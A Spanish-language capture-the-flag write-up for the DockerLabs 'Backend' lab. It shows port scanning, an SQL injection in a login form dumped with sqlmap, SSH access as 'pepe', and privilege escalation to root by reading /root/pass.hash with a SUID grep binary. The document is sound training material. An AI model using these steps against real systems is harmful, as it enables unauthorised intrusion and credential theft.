---
title: DockerLabs - Backend
summary: "Write-up del laboratorio Backend de DockerLabs"
author: elcybercurioso
date: 2025-11-04
categories: [Post, DockerLabs]
tags: [fácil, sqli, credentials leaking, privesc, grep, ls]
media_subpath: "/assets/img/posts/dockerlabs_backend"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Backend]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts 
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Backend]
└─$ nmap -sCV -p22,80 172.17.0.2                            
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 08:ba:95:95:10:20:1e:54:19:c3:33:a8:75:dd:f8:4d (ECDSA)
|_  256 1e:22:63:40:c9:b9:c5:6f:c2:09:29:84:6f:e7:0b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: test page
```

## análisis

Lo primero es acceder a la página principal del puerto 80 del laboratorio:

![Desktop View](/20251029140202.webp){: width="972" height="589" .shadow}

Encontramos que hay un formulario de login al que podemos acceder desde la pagina principal:

![Desktop View](/20251029141605.webp){: width="972" height="589" .shadow}

Haciendo pruebas, nos damos cuenta de que el formulario es vulnerable a un SQLi (SQL Injection):

![Desktop View](/20251029141530.webp){: width="972" height="589" .shadow}

## acceso inicial (pepe)

Dado que se trata de un SQLi de tipo error-based, podemos extraer la información usando `sqlmap`, al cual le vamos a pasar por parámetro una petición de login que capturamos con `Burp Suite` (la debemos guardar en nuestro equipo con la opción `Copy to file`):

![Desktop View](/20251029142755.webp){: width="972" height="589" .shadow}

Teniendo la petición guardada, se la pasamos a `sqlmap`, y lo ejecutamos con las opciones extremas, ya que nos encontramos en un entorno controlado, pero no es recomendable hacerlo de esta manera en entornos productivos, ya que podemos llegar a tirar la base de datos:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Backend]
└─$ sqlmap -r request.txt --level=5 --risk=3 --dump --batch
        ___
       __H__                                                                                                                                                                                                      
 ___ ___["]_____ ___ ___  {1.9.10#stable}                                                                                                                                                                         
|_ -| . [.]     | .'| . |                                                                                                                                                                                         
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                        
                              
Database: users
Table: usuarios
[3 entries]
+----+---------------+----------+
| id | password      | username |
+----+---------------+----------+
| 1  | $p*******     | paco     |
| 2  | P1*********** | pepe     |
| 3  | j**********   | juan     |
+----+---------------+----------+
```

Con las credenciales obtenidas, tratamos de conectarnos por SSH, y vemos que con el usuario `pepe` podemos acceder:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Backend]
└─$ ssh pepe@172.17.0.2
pepe@172.17.0.2's password: 
pepe@bbea568b3d7c:~$ whoami
pepe
pepe@bbea568b3d7c:~$ hostname -I
172.17.0.2
```

## escalada de privilegios (root)

Al ir a revisar los binarios que tengan permisos SUID, encontramos dos que nos pueden ser muy útiles: `ls` y `grep`:

```bash
pepe@bbea568b3d7c:~$ find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/grep
/usr/bin/su
/usr/bin/ls
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Con el binario `ls` podemos ver el contenido de carpetas a las que no tendríamos acceso de manera normal, y vemos que en la carpeta `/root` hay un fichero llamado `pass.hash`:

```bash
pepe@bbea568b3d7c:~$ ls -la /root
total 24
drwx------ 1 root root 4096 Aug 27  2024 .
drwxr-xr-x 1 root root 4096 Oct 29 12:16 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
drwx------ 2 root root 4096 Aug 27  2024 .ssh
-rw-r--r-- 1 root root   33 Aug 27  2024 pass.hash
```

Por otro lado, con el binario `grep` podemos llegar a leer ficheros con privilegios de `root`, tal y como nos indican en [GTFOBins](https://gtfobins.github.io/gtfobins/grep/#suid):

![Desktop View](/20251029144717.webp){: width="972" height="589" .shadow}

Teniendo esto claro, vamos a leer el contenido del fichero que supuestamente contiene el hash de la contraseña del usuario `root`:

```bash
pepe@bbea568b3d7c:/$ grep '' /root/pass.hash
e43833c4c9d5ac444e16bb94715a75e4
```

Obtenemos la contraseña en texto claro:

![Desktop View](/20251029144957.webp){: width="972" height="589" .shadow}

Probamos a conectarnos como `root` con la contraseña obtenida:

```bash
pepe@bbea568b3d7c:/$ su root
Password: 
root@bbea568b3d7c:/# whoami
root
```

Y así, habremos accedido como el usuario `root` al laboratorio!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>